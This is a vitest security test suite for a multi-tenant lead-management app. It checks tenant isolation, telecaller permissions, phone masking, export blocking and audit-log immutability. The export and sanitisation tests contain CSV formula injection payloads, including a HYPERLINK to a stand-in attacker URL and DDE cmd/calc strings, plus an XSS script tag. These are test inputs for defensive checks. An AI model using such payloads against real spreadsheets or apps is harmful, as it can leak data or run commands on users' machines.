import { describe, it, expect, beforeEach } from 'vitest';
import { db } from '@/services/supabase/db';
import { Profile, Lead } from '@/types';
import { sanitizeFormulaInjection, sanitizeText } from '@/lib/validation';
import { DEMO_PROFILES } from '@/services/supabase/demoData';

describe('LEADVAULT Phase 11: Adversarial Security & Penetration Validation', () => {
  // Test Personas
  const vertexOwner: Profile = DEMO_PROFILES.find((p) => p.id === 'prof-owner-001')!;
  const primeOwner: Profile = DEMO_PROFILES.find((p) => p.id === 'prof-owner-002')!;
  const telecallerArjun: Profile = DEMO_PROFILES.find((p) => p.id === 'tc-arjun-01')!;
  const telecallerRahul: Profile = DEMO_PROFILES.find((p) => p.id === 'tc-rahul-02')!;

  beforeEach(() => {
    db.resetSandbox();
  });

  // =========================================================================
  // 1. SUPABASE RLS & TENANT ISOLATION ADVERSARIAL TESTING (Section 3)
  // =========================================================================
  describe('Tenant & Lead Isolation (Section 3)', () => {
    it('Vertex owner cannot access Prime Careers (Tenant B) leads', () => {
      const vertexLeads = db.getLeads(vertexOwner);
      expect(vertexLeads.length).toBeGreaterThan(0);
      expect(vertexLeads.every((l) => l.organization_id === 'org-vertex-001')).toBe(true);

      // Attempt direct getLeadById on a Prime lead
      const primeLeads = db.getLeads(primeOwner);
      const primeLead = primeLeads[0];

      expect(() => {
        db.getLeadById(primeLead.id, vertexOwner);
      }).toThrow(/Forbidden/i);
    });

    it('Prime Careers owner cannot access Vertex Consultancy leads', () => {
      const vertexLeads = db.getLeads(vertexOwner);
      const vertexLead = vertexLeads[0];

      expect(() => {
        db.getLeadById(vertexLead.id, primeOwner);
      }).toThrow(/Forbidden/i);
    });

    it('Telecaller Arjun can access assigned leads, but is strictly DENIED access to Rahul leads, unassigned leads, and other org leads', () => {
      // 1. Assigned lead -> ALLOW
      const arjunQueue = db.getLeads(telecallerArjun);
      expect(arjunQueue.length).toBeGreaterThan(0);
      const assignedLead = arjunQueue[0];
      const retrieved = db.getLeadById(assignedLead.id, telecallerArjun);
      expect(retrieved.id).toBe(assignedLead.id);

      // 2. Rahul's lead -> DENY and raise security event
      const rahulQueue = db.getLeads(telecallerRahul);
      const rahulLead = rahulQueue[0];
      expect(() => {
        db.getLeadById(rahulLead.id, telecallerArjun);
      }).toThrow(/Forbidden/i);

      // Verify security event logged for unauthorized attempt
      const secEvents = db.getSecurityEvents(vertexOwner);
      expect(
        secEvents.some((e) => e.event_type === 'UNAUTHORIZED_LEAD_ACCESS_ATTEMPT' && e.user_id === telecallerArjun.id)
      ).toBe(true);

      // 3. Unassigned lead -> DENY
      const allVertexLeads = db.getLeads(vertexOwner);
      const unassignedLead = allVertexLeads.find((l) => !l.assigned_to);
      if (unassignedLead) {
        expect(() => {
          db.getLeadById(unassignedLead.id, telecallerArjun);
        }).toThrow(/Forbidden/i);
      }

      // 4. Another organization lead -> DENY
      const primeLead = db.getLeads(primeOwner)[0];
      expect(() => {
        db.getLeadById(primeLead.id, telecallerArjun);
      }).toThrow(/Forbidden/i);
    });
  });

  // =========================================================================
  // 2. DIRECT API TESTING (Section 4)
  // =========================================================================
  describe('Direct API Operation Protections (Section 4)', () => {
    it('Telecaller cannot UPDATE an unassigned lead or another telecaller lead', () => {
      const rahulLead = db.getLeads(telecallerRahul)[0];

      expect(() => {
        db.updateLead(rahulLead.id, { notes: 'Tampered note' }, telecallerArjun);
      }).toThrow(/Forbidden/i);
    });

    it('Telecaller can edit only status and notes on an assigned lead', () => {
      const assignedLead = db.getLeads(telecallerArjun)[0];
      const updated = db.updateLead(
        assignedLead.id,
        { status: 'CONTACTED', notes: 'Requested a follow-up.' },
        telecallerArjun
      );
      expect(updated.status).toBe('CONTACTED');
      expect(updated.notes).toContain('Requested a follow-up.');
      expect(updated.phone).toBeUndefined();
    });

    it('Telecaller cannot tamper with sensitive lead fields (phone, email, assigned_to, org_id)', () => {
      const assignedLead = db.getLeads(telecallerArjun)[0];

      expect(() => {
        db.updateLead(assignedLead.id, { phone: '+91 9999999999' as any }, telecallerArjun);
      }).toThrow(/Forbidden: Telecallers are not authorized/i);

      expect(() => {
        db.updateLead(assignedLead.id, { assigned_to: telecallerArjun.id }, telecallerArjun);
      }).toThrow(/Forbidden: Telecallers are not authorized/i);
    });

    it('Telecaller cannot DELETE leads under any circumstances', () => {
      const assignedLead = db.getLeads(telecallerArjun)[0];

      expect(() => {
        db.deleteLead(assignedLead.id, telecallerArjun);
      }).toThrow(/Forbidden: Telecallers cannot delete leads/i);

      // Verify high severity security event logged
      const secEvents = db.getSecurityEvents(vertexOwner);
      expect(secEvents.some((e) => e.event_type === 'UNAUTHORIZED_LEAD_DELETION_ATTEMPT')).toBe(true);
    });

    it('Owner cannot DELETE leads from another organization', () => {
      const primeLead = db.getLeads(primeOwner)[0];

      expect(() => {
        db.deleteLead(primeLead.id, vertexOwner);
      }).toThrow(/Forbidden/i);
    });

    it('Owner cannot ASSIGN leads belonging to another organization (Cross-Tenant Assignment)', () => {
      const primeLead = db.getLeads(primeOwner)[0];

      expect(() => {
        db.assignLeads([primeLead.id], telecallerArjun.id, vertexOwner);
      }).toThrow(/Forbidden: Cannot assign leads belonging to another organization/i);
    });

    it('CREATE lead cannot inject another organization_id', () => {
      const created = db.createLead(
        {
          name: 'Target Candidate',
          phone: '+91 9845011223',
          source: 'Website',
          priority: 'HIGH',
          status: 'NEW',
          notes: 'Test lead',
        },
        vertexOwner
      );

      // Enforced organization isolation: must match caller's org_id
      expect(created.organization_id).toBe(vertexOwner.organization_id);
      expect(created.organization_id).not.toBe('org-prime-002');
    });

    it('Telecaller cannot READ another telecaller call or another org call', () => {
      // 1. Read another telecaller's call
      const allVertexCalls = db.getCalls(vertexOwner);
      const rahulCall = allVertexCalls.find((c) => c.telecaller_id === telecallerRahul.id);

      if (rahulCall) {
        expect(() => {
          db.getCallById(rahulCall.id, telecallerArjun);
        }).toThrow(/Forbidden: Access denied to another telecaller's call/i);
      }

      // 2. Read another org call
      const primeCalls = db.getCalls(primeOwner);
      if (primeCalls.length > 0) {
        expect(() => {
          db.getCallById(primeCalls[0].id, vertexOwner);
        }).toThrow(/Forbidden: Access denied to call in another organization/i);
      }
    });

    it('Telecaller cannot MODIFY another telecaller call outcome', () => {
      const allVertexCalls = db.getCalls(vertexOwner);
      const rahulCall = allVertexCalls.find((c) => c.telecaller_id === telecallerRahul.id);

      if (rahulCall) {
        expect(() => {
          db.recordCallOutcome(
            {
              call_id: rahulCall.id,
              lead_id: rahulCall.lead_id,
              outcome: 'CONVERTED',
              notes: 'Malicious outcome overwrite attempt',
            },
            telecallerArjun
          );
        }).toThrow(/Forbidden/i);
      }
    });
  });

  // =========================================================================
  // 3. PHONE NUMBER SECURITY & ZERO-LEAKAGE AUDIT (Sections 5 & 6)
  // =========================================================================
  describe('Phone Number Security & Data Masking Audit (Sections 5 & 6)', () => {
    it('Telecaller query results return ZERO phone digits (phone omitted completely)', () => {
      const arjunLeads = db.getLeads(telecallerArjun);
      expect(arjunLeads.length).toBeGreaterThan(0);

      arjunLeads.forEach((lead) => {
        // Zero-Phone Invariant: phone must be strictly undefined and omitted
        expect(lead.phone).toBeUndefined();
        expect('phone' in lead).toBe(false);

        // Name must be first name + initial
        expect(lead.name).toMatch(/^[A-Za-z]+\s[A-Z]\.$/);
      });
    });

    it('Direct client extraction via getAuthorizedCallingNumber is BLOCKED for telecallers', () => {
      const assignedLead = db.getLeads(telecallerArjun)[0];

      expect(() => {
        db.getAuthorizedCallingNumber(assignedLead.id, telecallerArjun);
      }).toThrow(/Client-side extraction of raw customer phone numbers is prohibited/i);

      // Verify security alert logged
      const secEvents = db.getSecurityEvents(vertexOwner);
      expect(secEvents.some((e) => e.event_type === 'UNAUTHORIZED_PHONE_EXTRACTION_ATTEMPT')).toBe(true);
    });

    it('Owner and Admin can retrieve authorized phone numbers for approved operations', () => {
      const lead = db.getLeads(vertexOwner)[0];
      const phone = db.getAuthorizedCallingNumber(lead.id, vertexOwner);
      expect(phone).toBeDefined();
      expect(phone).toContain('9');
    });
  });

  // =========================================================================
  // 4. EXPORT SECURITY (Section 9)
  // =========================================================================
  describe('Export Protection (Section 9)', () => {
    it('Telecaller cannot export the lead database via direct API or export methods', () => {
      expect(() => {
        db.exportLeads(telecallerArjun, 'csv');
      }).toThrow(/Forbidden: Telecallers are strictly prohibited from exporting/i);

      // Ensure high-severity event was raised
      const secEvents = db.getSecurityEvents(vertexOwner);
      expect(secEvents.some((e) => e.event_type === 'TELECALLER_EXPORT_BLOCKED')).toBe(true);
    });

    it('Owner export sanitizes formulas to prevent CSV formula injection', () => {
      // Create a lead with potential formula injection
      db.createLead(
        {
          name: '=HYPERLINK("http://attacker.com/steal")',
          phone: '+91 9845012349',
          source: '+cmd|/C calc',
          priority: 'HIGH',
          status: 'NEW',
          notes: '@SUM(1+1)',
        },
        vertexOwner
      );

      const exportedLeads = db.exportLeads(vertexOwner, 'csv');
      const dangerousLead = exportedLeads.find((l) => l.phone === '+91 9845012349');
      expect(dangerousLead).toBeDefined();

      // All dangerous spreadsheet prefixes must start with single quote
      expect(dangerousLead!.name.startsWith("'=")).toBe(true);
      expect(dangerousLead!.source.startsWith("'+")).toBe(true);
      expect(dangerousLead!.notes?.startsWith("'@")).toBe(true);
    });
  });

  // =========================================================================
  // 5. CSV FORMULA INJECTION DEFENSE (Section 15 & 16)
  // =========================================================================
  describe('CSV / Spreadsheet Formula Injection Defense (Section 16)', () => {
    it('Sanitizes dangerous formula prefixes (=, +, -, @, tab, return)', () => {
      expect(sanitizeFormulaInjection('=cmd|\'/C calc\'!A0')).toBe('\'=cmd|\'/C calc\'!A0');
      expect(sanitizeFormulaInjection('+12345')).toBe('\'+12345');
      expect(sanitizeFormulaInjection('-DDE("cmd";"calc")')).toBe('\'-DDE("cmd";"calc")');
      expect(sanitizeFormulaInjection('@SUM(A1:A10)')).toBe('\'@SUM(A1:A10)');
      expect(sanitizeFormulaInjection('\t=1+1')).toBe('\'=1+1');
      expect(sanitizeFormulaInjection('Normal Customer Name')).toBe('Normal Customer Name');
    });

    it('Sanitizes HTML and script tags from text inputs', () => {
      const sanitized = sanitizeText('<script>alert("XSS")</script><b>Vikram</b>');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toBe('Vikram');
    });
  });

  // =========================================================================
  // 6. REALTIME TENANT ISOLATION (Section 11)
  // =========================================================================
  describe('Realtime Event Isolation (Section 11)', () => {
    it('Organization A listener does not receive events emitted by Organization B', () => {
      const receivedEvents: any[] = [];

      // Subscriber in Organization A (Vertex)
      const unsubscribe = db.subscribe((event) => {
        receivedEvents.push(event);
      }, telecallerArjun);

      // Event emitted in Organization B (Prime)
      db.createLead(
        {
          name: 'Prime Exclusive Lead',
          phone: '+91 9845099999',
          source: 'Website',
          priority: 'HIGH',
          status: 'NEW',
        },
        primeOwner
      );

      // Arjun (Org A) must NOT receive Organization B's event!
      expect(receivedEvents.length).toBe(0);

      unsubscribe();
    });
  });

  // =========================================================================
  // 7. DISABLED ACCOUNT SESSION REVOCATION (Section 18)
  // =========================================================================
  describe('Disabled Account Enforcement (Section 18)', () => {
    it('Deactivated telecaller loses all access to protected database operations', () => {
      // Disable Arjun
      db.updateProfileStatus(telecallerArjun.id, 'DISABLED', vertexOwner);

      const disabledArjun = { ...telecallerArjun, status: 'DISABLED' as const };

      expect(() => db.getLeads(disabledArjun)).toThrow(/Forbidden: Account has been suspended/i);
      expect(() => db.getCalls(disabledArjun)).toThrow(/Forbidden: Account has been suspended/i);
      expect(() => db.getActivityLogs(disabledArjun)).toThrow(/Forbidden: Account has been suspended/i);
      expect(() => db.recordCall({ lead_id: 'any', duration_seconds: 10, status: 'COMPLETED' }, disabledArjun)).toThrow(
        /Forbidden: Account has been suspended/i
      );
    });
  });

  // =========================================================================
  // 8. AUDIT LOG & SECURITY EVENT IMMUTABILITY (Sections 19 & 20)
  // =========================================================================
  describe('Audit Trail Immutability (Sections 19 & 20)', () => {
    it('Activity logs and security events strictly reject modification and deletion', () => {
      expect(() => db.deleteActivityLog()).toThrow(/Security Violation: Activity audit logs are append-only/i);
      expect(() => db.updateActivityLog()).toThrow(/Security Violation: Activity audit logs are strictly immutable/i);
      expect(() => db.deleteSecurityEvent()).toThrow(/Security Violation: Security events are append-only/i);
      expect(() => db.updateSecurityEvent()).toThrow(/Security Violation: Security events are strictly immutable/i);
    });
  });

  // =========================================================================
  // 9. SEARCH SECURITY (Section 22)
  // =========================================================================
  describe('Search Authorization & Leakage Guard (Section 22)', () => {
    it('Telecaller search only returns authorized assigned leads', () => {
      const searchResults = db.searchLeads('Deepika', telecallerArjun);
      // Even if Deepika exists in master database, if not assigned to Arjun, must NOT be returned
      expect(searchResults.every((l) => l.assigned_to === telecallerArjun.id)).toBe(true);

      // Search by partial phone returns only masked leads assigned to caller
      const phoneSearchResults = db.searchLeads('98450', telecallerArjun);
      expect(phoneSearchResults.every((l) => l.assigned_to === telecallerArjun.id)).toBe(true);
    });
  });
});
